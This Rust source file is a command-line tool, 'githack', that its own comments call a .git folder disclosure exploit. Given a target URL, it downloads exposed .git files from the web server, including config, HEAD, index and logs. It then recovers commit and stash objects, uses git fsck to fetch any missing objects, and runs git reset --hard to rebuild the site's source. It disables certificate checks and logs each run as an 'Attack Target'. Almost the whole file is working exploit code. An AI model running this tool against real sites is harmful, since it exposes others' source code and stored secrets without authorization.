//! @alias: gh
//! @about: A .git folder disclosure exploit tool

use anyhow::Result;
use clap::Parser;
use regex::Regex;
use std::collections::HashSet;
use std::fs::{self, File};
use std::io::{BufRead, BufReader};
use std::path::{Path, PathBuf};
use std::process::Command;
use std::sync::Arc;
use tokio::sync::Semaphore;
use tracing::{debug, info, warn};

use crate::CmdExecute;

/// Base git files to fetch
const BASE_FILES: &[&str] = &[
    ".git/ORIG_HEAD",
    ".git/config",
    ".git/HEAD",
    ".git/info/exclude",
    ".git/logs/HEAD",
    ".git/logs/refs/heads/master",
    ".git/logs/refs/stash",
    ".git/description",
    ".git/hooks/commit-msg.sample",
    ".git/hooks/pre-rebase.sample",
    ".git/hooks/pre-commit.sample",
    ".git/hooks/applypatch-msg.sample",
    ".git/hooks/fsmonitor-watchman.sample",
    ".git/hooks/pre-receive.sample",
    ".git/hooks/prepare-commit-msg.sample",
    ".git/hooks/post-update.sample",
    ".git/hooks/pre-applypatch.sample",
    ".git/hooks/pre-push.sample",
    ".git/hooks/update.sample",
    ".git/refs/heads/master",
    ".git/refs/stash",
    ".git/index",
    ".git/COMMIT_EDITMSG",
];

/// A .git folder disclosure exploit tool
#[derive(Debug, Parser)]
#[clap(name = "githack")]
pub struct Cmd {
    /// Target URL
    #[arg()]
    pub target: String,

    /// Request limit (concurrent)
    #[arg(short, long, default_value = "10")]
    pub limit: usize,

    /// Request delay (ms)
    #[arg(short, long, default_value = "0")]
    pub delay: u64,

    /// Request timeout (s)
    #[arg(short = 'T', long, default_value = "10")]
    pub timeout: u64,
}

impl CmdExecute for Cmd {
    async fn execute(&self) -> Result<()> {
        git_hack(&self.target, self.limit, self.delay, self.timeout).await
    }
}

/// Parse URL and create temp directory
fn parse_url(target_url: &str) -> Result<(String, PathBuf)> {
    let url = url::Url::parse(target_url)?;
    let mut temp_dir = url.host_str().unwrap_or("unknown").to_string();
    // Replace bad characters
    for bad in &['.', '/', '\\', '\'', '"', ':'] {
        temp_dir = temp_dir.replace(*bad, "_");
    }
    // Normalize the URL
    let base_url = target_url.trim_end_matches(".git/").trim_end_matches('/');

    Ok((base_url.to_string(), PathBuf::from(&temp_dir)))
}

/// Downloader struct to handle concurrent downloads
struct Downloader {
    client: reqwest::Client,
    semaphore: Arc<Semaphore>,
    delay_ms: u64,
}

impl Downloader {
    fn new(limit: usize, timeout_secs: u64, delay_ms: u64) -> Self {
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(timeout_secs))
            .danger_accept_invalid_certs(true)
            .build()
            .unwrap_or_default();

        Self {
            client,
            semaphore: Arc::new(Semaphore::new(limit)),
            delay_ms,
        }
    }

    #[allow(dead_code)]
    async fn download(&self, url: &str, dest: &Path) -> Result<bool> {
        let _permit = self.semaphore.acquire().await?;

        if self.delay_ms > 0 {
            tokio::time::sleep(std::time::Duration::from_millis(self.delay_ms)).await;
        }

        debug!("Downloading: {}", url);

        let response = match self.client.get(url).send().await {
            Ok(r) => r,
            Err(e) => {
                debug!("Failed to download {}: {}", url, e);
                return Ok(false);
            }
        };

        if !response.status().is_success() {
            debug!("HTTP {} for {}", response.status(), url);
            return Ok(false);
        }

        let bytes = response.bytes().await?;
        if bytes.is_empty() {
            return Ok(false);
        }

        // Create parent directories
        if let Some(parent) = dest.parent() {
            fs::create_dir_all(parent)?;
        }

        fs::write(dest, bytes)?;
        Ok(true)
    }

    async fn download_batch(&self, tasks: Vec<(String, PathBuf)>) -> Result<usize> {
        let mut handles = Vec::new();

        for (url, dest) in tasks {
            let client = self.client.clone();
            let sem = self.semaphore.clone();
            let delay = self.delay_ms;

            handles.push(tokio::spawn(async move {
                let _permit = sem.acquire().await.ok()?;

                if delay > 0 {
                    tokio::time::sleep(std::time::Duration::from_millis(delay)).await;
                }

                debug!("Downloading: {}", url);

                let response = client.get(&url).send().await.ok()?;
                if !response.status().is_success() {
                    return None;
                }

                let bytes = response.bytes().await.ok()?;
                if bytes.is_empty() {
                    return None;
                }

                if let Some(parent) = dest.parent() {
                    fs::create_dir_all(parent).ok()?;
                }

                fs::write(&dest, bytes).ok()?;
                Some(())
            }));
        }

        let mut success_count = 0;
        for handle in handles {
            if let Ok(Some(())) = handle.await {
                success_count += 1;
            }
        }

        Ok(success_count)
    }
}

/// Fetch git objects from log files
async fn fetch_objects(
    downloader: &Downloader,
    base_url: &str,
    temp_dir: &Path,
    stash: bool,
) -> Result<()> {
    let log_path = if stash {
        temp_dir.join(".git/logs/refs/stash")
    } else {
        temp_dir.join(".git/logs/refs/heads/master")
    };

    if !log_path.exists() {
        return Ok(());
    }

    let file = File::open(&log_path)?;
    let reader = BufReader::new(file);
    let mut tasks = Vec::new();

    for line in reader.lines() {
        let line = line?;
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.len() < 2 {
            continue;
        }

        let hash = parts[1];
        if hash.len() < 40 {
            continue;
        }

        let target = format!(".git/objects/{}/{}", &hash[..2], &hash[2..40]);
        let url = format!("{base_url}/{target}");
        let dest = temp_dir.join(&target);

        if !dest.exists() {
            tasks.push((url, dest));
        }
    }

    if !tasks.is_empty() {
        downloader.download_batch(tasks).await?;
    }

    Ok(())
}

/// Fix missing git objects by running git fsck
async fn fix_missing_objects(
    downloader: &Downloader,
    base_url: &str,
    temp_dir: &Path,
) -> Result<()> {
    let output = Command::new("git")
        .arg("fsck")
        .current_dir(temp_dir)
        .output();

    let output = match output {
        Ok(o) => o,
        Err(e) => {
            warn!("Failed to run git fsck: {}", e);
            return Ok(());
        }
    };

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);
    let combined = format!("{stdout}{stderr}");

    debug!("git fsck output: {}", combined);

    let re = Regex::new(r"([a-fA-F0-9]{40})")?;
    let mut hashes: HashSet<String> = HashSet::new();

    for cap in re.captures_iter(&combined) {
        hashes.insert(cap[1].to_string());
    }

    if hashes.is_empty() {
        return Ok(());
    }

    let mut tasks = Vec::new();
    for hash in &hashes {
        let target = format!(".git/objects/{}/{}", &hash[..2], &hash[2..40]);
        let url = format!("{base_url}/{target}");
        let dest = temp_dir.join(&target);

        if !dest.exists() {
            info!("Fetch Object: {}", target);
            tasks.push((url, dest));
        }
    }

    if !tasks.is_empty() {
        downloader.download_batch(tasks).await?;
        // Recursively fix missing objects
        Box::pin(fix_missing_objects(downloader, base_url, temp_dir)).await?;
    }

    Ok(())
}

/// Main git hack function
async fn git_hack(target_url: &str, limit: usize, delay: u64, timeout: u64) -> Result<()> {
    info!("Attack Target: {}", target_url);

    let (base_url, temp_dir) = parse_url(target_url)?;
    info!("BaseURL: {}", base_url);
    info!("TempDir: {}", temp_dir.display());

    let downloader = Downloader::new(limit, timeout, delay);

    // Fetch base files
    info!("Fetch Base Files...");
    let base_tasks: Vec<(String, PathBuf)> = BASE_FILES
        .iter()
        .map(|f| {
            let url = format!("{base_url}/{f}");
            let dest = temp_dir.join(f);
            (url, dest)
        })
        .collect();

    let count = downloader.download_batch(base_tasks).await?;
    info!("Downloaded {} base files", count);

    // Fetch commit objects
    info!("Fetch Commit Objects...");
    fetch_objects(&downloader, &base_url, &temp_dir, false).await?;

    // Fetch stash objects
    info!("Fetch Stash Objects...");
    fetch_objects(&downloader, &base_url, &temp_dir, true).await?;

    // Fix missing objects
    info!("Fetch Missing Objects...");
    fix_missing_objects(&downloader, &base_url, &temp_dir).await?;

    // Git reset
    info!("Git Reset...");
    let output = Command::new("git")
        .args(["reset", "--hard"])
        .current_dir(&temp_dir)
        .output();

    match output {
        Ok(o) => {
            if !o.status.success() {
                let stderr = String::from_utf8_lossy(&o.stderr);
                warn!("git reset failed: {}", stderr);
            }
        }
        Err(e) => {
            warn!("Failed to run git reset: {}", e);
        }
    }

    info!("Fetched Info Complete!");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_url() {
        let (base, dir) = parse_url("http://example.com/.git/").unwrap();
        assert_eq!(base, "http://example.com");
        assert_eq!(dir.to_str().unwrap(), "example_com");
    }

    #[test]
    fn test_parse_url_with_path() {
        let (base, _) = parse_url("http://example.com/path/.git/").unwrap();
        assert_eq!(base, "http://example.com/path");
    }
}
